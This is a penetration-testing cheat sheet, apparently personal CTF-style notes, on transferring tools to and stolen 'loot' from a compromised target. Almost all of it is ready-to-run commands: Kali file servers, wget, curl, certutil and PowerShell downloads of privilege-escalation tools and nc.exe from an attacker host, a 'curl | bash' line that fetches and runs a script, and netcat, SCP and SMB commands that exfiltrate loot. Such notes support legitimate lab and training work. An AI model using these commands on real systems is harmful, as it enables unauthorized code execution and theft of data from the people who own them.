# 📇 File Transfer Cheat Sheet

> Scan-only. Getting tools onto / loot off a target. Related: [[Shells]] · [[Windows Privilege Escalation]] · [[Linux Privilege Escalation]].

## Serve from Kali
```bash
python3 -m http.server 80
```
```bash
impacket-smbserver share . -smb2support        # SMB share (add user/pass if needed)
```
```bash
sudo python3 -m pyftpdlib -p 21 -w            # quick FTP (if installed)
```

## Download — Linux target
```bash
wget http://10.10.14.5/linpeas.sh -O /tmp/linpeas.sh
```
```bash
curl http://10.10.14.5/linpeas.sh -o /tmp/linpeas.sh
```
```bash
curl http://10.10.14.5/s.sh | bash            # run without saving
```

## Download — Windows target
```bash
certutil -urlcache -f http://10.10.14.5/winPEAS.exe winPEAS.exe
```
```powershell
iwr http://10.10.14.5/winPEAS.exe -OutFile winPEAS.exe
```
```powershell
(New-Object Net.WebClient).DownloadFile('http://10.10.14.5/nc.exe','C:\Windows\Temp\nc.exe')
```
SMB pull from Kali share:
```cmd
copy \\10.10.14.5\share\winPEAS.exe .
```

## Upload / exfil loot to Kali
```bash
nc -lvnp 443 > loot.zip        # Kali ;  victim: nc 10.10.14.5 443 < loot.zip
```
```bash
scp user@$IP:/path/loot .      # if you have SSH creds
```
Via SMB share (writeable): `copy loot.zip \\10.10.14.5\share\`.

## Rules
- Prefer HTTP (`python3 -m http.server`) — works almost everywhere.
- Windows: `certutil` / `iwr` are the go-to. Use `C:\Windows\Temp` for writable space.
- evil-winrm has built-in `upload`/`download`.
